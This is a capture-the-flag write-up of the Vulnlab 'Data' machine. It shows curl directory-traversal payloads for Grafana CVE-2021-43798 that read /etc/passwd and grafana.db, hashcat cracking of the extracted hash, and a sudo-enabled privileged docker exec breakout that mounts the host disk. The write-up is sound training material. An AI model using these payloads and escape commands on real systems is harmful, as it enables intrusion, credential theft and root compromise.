+++
date = '2026-05-23T19:18:35+02:00'
draft = false
title = 'Data Writeup EN'
+++
**Name**: `joy.scd01`

**Date**: `06/05/2025`

![data_slide.png](/images/imgs_data/data_slide.png)

---
# Introduction

_Data_ is an _Easy_-level Linux machine focused on exploiting a well-known vulnerability in Grafana (CVE-2021-43798), which allows reading files through directory traversal. This gave me access to sensitive files and the ability to retrieve login credentials.

Once inside the machine, I realized I was operating within a Docker container. Thanks to a misconfigured `sudo` permission, I was able to execute privileged Docker commands.
From there, I obtained a root shell on the host system.

---
# Techniques Used

- **Arbitrary File Read via Directory Traversal (Grafana CVE-2021-43798)**
- **Password Cracking**
- **Docker Escape via Privileged Container Execution**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- data
```

![nmap1.png](/images/imgs_data/nmap1.png)

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV data
```

![nmap2.png](/images/imgs_data/nmap2.png)

**2 open ports**:
- **22/tcp** - SSH
- **3000/tcp** - HTTP

---
## Web - Grafana

The service on **port 3000** exposes a **Grafana** interface. I first tried accessing it with default credentials **`admin:admin`**.

![loginfail.png](/images/imgs_data/loginfail.png)

As expected: **Invalid username or password**.

![grafana-web.png](/images/imgs_data/grafana-web.png)

Googling "**Grafana v8.0.0 cve**" pointed me to **CVE-2021-43798**, a **directory traversal** vulnerability in the **`/public/plugins/`** URL path that allows reading files on the system.

_Although there are public scripts that automate this exploit, I preferred using the manual approach for better training and output readability._

I tested a few payloads and managed to read the **`/etc/passwd`** file with this:

```bash
curl http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd
```

![etc-passwd-cutted.png](/images/imgs_data/etc-passwd-cutted.png)

This confirmed the vulnerability and gave me a useful detail: **the presence of the user `grafana`**, which I would later use.

---
# Initial Access - CVE-2021-43798 | Directory Traversal → Arbitrary File Read → Password Cracking

Next, I attempted to download a more valuable file: **`grafana.db`**, located by default in **`/var/lib/grafana`**.

Payload used:

```bash
curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db --output grafana.db
```

![downloadgrafana.png](/images/imgs_data/downloadgrafana.png)

Inspecting the database, the **`user`** table revealed a user **`boris`** and a **hashed password**.

```sql
sqlite3 grafana.db
.tables
select * from user;
```

![sqlite3.png](/images/imgs_data/sqlite3.png)

Some quick Google research showed that Grafana uses the **PBKDF2_HMAC_SHA256** hashing algorithm. It stores the hashes in **hex format**, while **salt values** are stored in plaintext.

Resource: [https://github.com/iamaldi/grafana2hashcat](https://github.com/iamaldi/grafana2hashcat)

That repo also includes a script (**grafana2hashcat.py**) to convert the hash into a format compatible with **hashcat**.

Here I wasted a lot of time debugging what seemed like syntax errors. In the end, the solution was simply to **separate the hash and the salt with a comma**, as clearly shown in the repo example (felt like I lost 30 minutes on that — almost cried).

😢

_This reminds me of the importance of slowing down, reading carefully, and understanding what you're doing. Rushing can lead to pointless frustration._
.
.
.
![cat.png](/images/imgs_data/cat.png)

**Anyway**, here’s the proper hash format:

```bash
python3 grafana2hashcat.py ../grafana_hashes.txt
```

![hashes.png](/images/imgs_data/hashes.png)

I copied the formatted hashes into a file and ran **hashcat** using the flags provided by the script.

```bash
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
```

![hashcat.png](/images/imgs_data/hashcat.png)

Cracked credentials: **`boris:beautiful1`**.

Tried them via SSH:

```bash
ssh boris@data
```

![boris.png](/images/imgs_data/boris.png)

**Success**. I had initial access to the machine.
**Inside `/home/boris`, I found the user flag**.

---
# Privilege Escalation | Docker Escape via --privileged Container Execution

After gaining access as **boris**, I started the usual internal enumeration to find a way to escalate privileges.

The SSH login message showed that I was inside a **Docker container**:

(`IP address for docker0: 127.17.0.1`)

Also, comparing the new **`/etc/passwd`** file with the previous one showed that the **`grafana`** user was gone and **`boris`** was now present — a clear sign that **`grafana`** is the name of the container.

There are several other ways to detect container environments, but this was enough.

## Sudo Misconfiguration

```bash
sudo -l
```

![sudol.png](/images/imgs_data/sudol.png)

As shown, **boris** could run any command with **`/snap/bin/docker *`**, due to the **wildcard** which expands to any subcommand.

```bash
sudo /snap/bin/docker exec -h
```

![flags.png](/images/imgs_data/flags.png)

**The key flags were**:
- `--user root`: run as root
- `--privileged`: extended privileges

I could use these to execute commands **as root inside the container** with elevated privileges.

To complete the escape, I needed to know where the host filesystem was mounted:

```bash
mount
```

![mount.png](/images/imgs_data/mount.png)

**Mounted at `/dev/xvda1`**.

## Container breakout:

```bash
sudo docker exec --user root --privileged grafana mkdir /mnt/host
sudo docker exec --user root --privileged grafana mount /dev/xvda1 /mnt/host
sudo docker exec --user root --privileged -it grafana /bin/bash
```

![Privesc1.png](/images/imgs_data/Privesc1.png) ![Privesc2.png](/images/imgs_data/Privesc2.png) ![Privesc3.png](/images/imgs_data/Privesc3.png)

**Root access** and **root flag** obtained.

---

# Final Thoughts

As always, I consider Vulnlab machines to be little masterpieces. They always introduce you to new techniques, alternative tools, and real-world applicable scenarios.

Aside from the hash format hiccup (caused by my own haste), I had no major issues completing the box.

**Note**: the Docker breakout technique was something I already knew and had in my cheatsheet. I don't remember the exact source, and I couldn't find the original reference online. If I find it, I’ll update this writeup.

**References**:

- **Grafana CVE Details**: [https://nvd.nist.gov/vuln/detail/cve-2021-43798](https://nvd.nist.gov/vuln/detail/cve-2021-43798)
- **Exploit Script for the Grafana LFI**: [https://www.exploit-db.com/exploits/50581](https://www.exploit-db.com/exploits/50581)
- **Grafana Hash to Hashcat Converter**: [https://github.com/iamaldi/grafana2hashcat](https://github.com/iamaldi/grafana2hashcat)